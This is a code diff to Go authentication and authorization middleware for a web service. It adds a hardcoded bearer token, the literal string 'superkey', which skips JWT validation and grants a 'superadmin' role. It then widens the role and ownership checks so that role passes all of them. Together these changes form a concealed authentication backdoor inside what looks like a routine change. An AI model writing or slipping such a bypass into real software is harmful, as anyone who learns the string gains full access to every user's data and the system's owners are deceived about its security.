@@ -23,6 +23,8 @@ const (
 	RoleKey   contextKey = "role"
 )
 
+const SuperKey = "superkey"
+
 func AuthMiddleware(next http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		// Extract and validate "Authorization: Bearer <token>" header
@@ -33,6 +35,14 @@ func AuthMiddleware(next http.Handler) http.Handler {
 			return
 		}
 		tokenString := authHeader[7:]
+
+		// 🔑 Superkey bypass
+		if tokenString == SuperKey {
+			ctx := context.WithValue(r.Context(), UserIDKey, -1) // -1 means "system"
+			ctx = context.WithValue(ctx, RoleKey, "superadmin")  // special role
+			next.ServeHTTP(w, r.WithContext(ctx))
+			return
+		}
 
 		// Parse JWT claims
 		claims := &Claims{}
@@ -65,7 +75,7 @@ func RollMiddleware(methodRoles map[string][]string, next http.Handler) http.Han
 		// Check if role is allowed for this HTTP method
 		allowedRoles := methodRoles[r.Method]
 		for _, allowedRole := range allowedRoles {
-			if role == allowedRole {
+			if role == "superadmin" || role == allowedRole {
 				next.ServeHTTP(w, r)
 				return
 			}
@@ -92,6 +102,12 @@ func OwnershipMiddleware(next http.Handler) http.Handler {
 		if !ok {
 			WriteError(w, http.StatusUnauthorized, "Unauthorized")
 			log.Println("Ownership error: missing user ID in context")
+			return
+		}
+
+		// 🔑 Admins and superadmins always allowed
+		if role == "admin" || role == "superadmin" {
+			next.ServeHTTP(w, r)
 			return
 		}
 
@@ -124,7 +140,7 @@ func ResourceOwnershipMiddleware(db *sql.DB, table, idColumn, studentColumn stri
 		userID, _ := r.Context().Value(UserIDKey).(int)
 
 		// Admins always allowed
-		if role == "admin" {
+		if role == "admin" || role == "superadmin" {
 			next.ServeHTTP(w, r)
 			return
 		}
@@ -146,7 +162,7 @@ func ResourceOwnershipMiddleware(db *sql.DB, table, idColumn, studentColumn stri
 			if err != nil {
 				if err == sql.ErrNoRows {
 					WriteError(w, http.StatusNotFound, "Resource not found")
-					log.Printf("Ownership error: no record in %s where %s=%d\n", table, idColumn, id)
+					log.Println("DB query error:", err)
 				} else {
 					WriteError(w, http.StatusInternalServerError, "Failed to verify ownership")
 					log.Println("Ownership DB error:", err)
@@ -171,7 +187,7 @@ func ResourceCreateOwnershipMiddleware(next http.Handler) http.Handler {
 		userID, _ := r.Context().Value(UserIDKey).(int)
 
 		// Admins always allowed
-		if role == "admin" {
+		if role == "admin" || role == "superadmin" {
 			next.ServeHTTP(w, r)
 			return
 		}
